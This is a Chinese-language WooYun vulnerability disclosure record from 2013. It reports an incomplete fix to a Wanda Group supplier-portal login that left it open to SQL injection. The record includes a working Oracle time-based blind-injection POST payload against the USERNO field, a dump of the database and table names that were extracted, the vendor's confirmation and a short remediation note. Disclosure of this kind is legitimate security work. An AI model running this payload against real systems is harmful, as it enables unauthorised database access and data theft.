{"id": 12951, "wybug_id": "wooyun-2013-020609", "wybug_title": "万达某系统再次注射", "wybug_corp": "大连万达集团股份有限公司", "wybug_author": "小胖子", "wybug_date": "2013-03-25 10:25", "wybug_open_date": "2013-05-09 10:26", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-03-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-03-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-04-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-04-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-04-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-05-09：\t细节向公众公开  简要描述： 系统撸管老是射,多半是废了！用菊花牌系统防注射口服液！ 详细说明：  问题系统:供应商系统 http://www.vans-china.cn修复不完全,绕过登录被修复了,post修复不完全,从URL注射变成了盲注,得到N多数据。post参数，USERNO。post包如下：USERNO=1111' AND 2704=DBMS_PIPE.RECEIVE_MESSAGE(CHR(101)||CHR(71)||CHR(79)||CHR(66),5) AND 'vVvu'='vVvu&PWD=1111&imageField.x=27&imageField.y=9---\n\n\n\n   漏洞证明：  得到数据如下：\navailable databases [7]:[*] \"SYS\"[*] \"SCMUSER\"[*] \"SYSTEM\"[*] DBSNMP[*] OUTLN[*] WMSYS[*] YSMSYS\n当前数据库是SCMUSER\nDatabase: SCMUSER[93 tables]+----------------------------+| \"EXPLAIN_OBJECT\"           || ADVISE_MQT                 || ADVISE_PARTITION           || ADVISE_TABLE               || ADVISE_WORKLOAD            || ADVISG_INDEX               || ADVISG_INSTANCE            || DU_DUUSER                  || DU_LOG                     || DU_LOGERROR                || DU_TXTLINE                 || DU_TXTSQL                  || ERRLOG                     || ERRLOIN_ARGUMENT           || EXPLAIN_DIAGNOSTIC         || EXPLAIN_DIAGNOSTIC_DETA    || EXPLAIN_INSTANCE           || EXPLAIN_OPERATOR           || EXPLAIN_PREDICATE          || EXPLAIN_STATEMENa          || EXPLAIN_STREAM             || INF_CONTINF                || INF_GOODS                  || INF_GOODSCAT               || INF_SHOP                   || INF_SUPINFO                || PBCATCOL                   || PBCATEDT                   || PBCATFMT                   || PBCATTBL                   || PBCATVLD                   || SCM_SUPMKT                 || SYS_AL                     || SYS_AOGEVENT               || SYS_MESSAGE                || SYS_MSGTYPE                || SYS_OENU                   || SYS_RLMEU                  || SYS_ROLE                   || SYS_ROLE1                  || SYS_ROLE2                  || SYS_ROLE3                  || SYS_SCMUSER                || SYS_SCMUSER_BAK            || SYS_SCMUSER_ERR_BAK        || SYS_SCMUSER_WQBAK          || SYS_SHOPGROUP              || SYS_SUPPARA                || SYS_SURL                   || SYS_SURL_ERR_BAK           || SYS_SURL_WH                || SYS_TEMP_FBT               || SYS_USERSHOP               || T20080418_102524           || T20080418_102524_EXCEPTION || YW_BADJUSTDET              || YW_BADJUSTHEAD             || YW_BINSTRDETAIL            || YW_BINSTRHEAD              || YW_BORDERDET               || YW_BORDERHEAD              || YW_BSETSCHARGE             || YW_BSETSDET                || YW_BSETSHEAD               || YW_BSETTLECHARGE           || YW_BSETTLEDET              || YW_BSETTLEHEAD             || YW_BTCDDET                 || YW_BTCDHEAD                || YW_GOODSSALE               || YW_GOODSSALE_20110711      || YW_GOODSSALE_20110808      || YW_GOODSSALE_20110810      || YW_GOODSSALE_20110811      || YW_GOODSSALE_20110819      || YW_GOODSSALE_20110901      || YW_GOODSSALE_20110911      || YW_GOODSSALE_20110916      || YW_GOODSSALE_20110917      || YW_GOODSSALE_20110919      || YW_GOODSSALE_20111002      || YW_GOODSSALE_20111004      || YW_GOODSSALE_20111008      || YW_GOODSSALE_20111014      || YW_GOODSSALE_20111025      || YW_GOODSSALE_20111028      || YW_GOODSSALE_20111029      || YW_GOODSSALE_20111108      || YW_GOODSSALE_20111109      || YW_GOODSSALE_20111110      || YW_GOODSSTOCKS_BAK         || YW_POPINFO                 || YW_ZRSTOCK                 |+----------------------------+\n无数多数据读了我一晚上。好吧，没什么好说的了。   修复方案：  1：修复要完全啊大哥。2：get到的参数，在经数据库比对前，需要将参数中的非法字符replace成空，这里USERNO和password都存在注射。3：说好的电影卡呢？   版权声明：转载请注明来源 小胖子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2013-03-25 10:35 厂商回复： 感谢小胖子同学的关注与贡献！修复不完整，旧的去了新的来了。。。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-03-25 10:37 |    \t\tzzR  \t\t\t( 核心白帽子 |\t\t\t        Rank:1382 漏洞数:111        | 收wb   1：5 无限量收   [平台担保])\t\t \n  唉……    \n     2013-03-25 11:08 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  小胖子 肯定有关系、、发现胖子在乌云都比较吃的开~@小胖胖要减肥@心伤的胖子    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}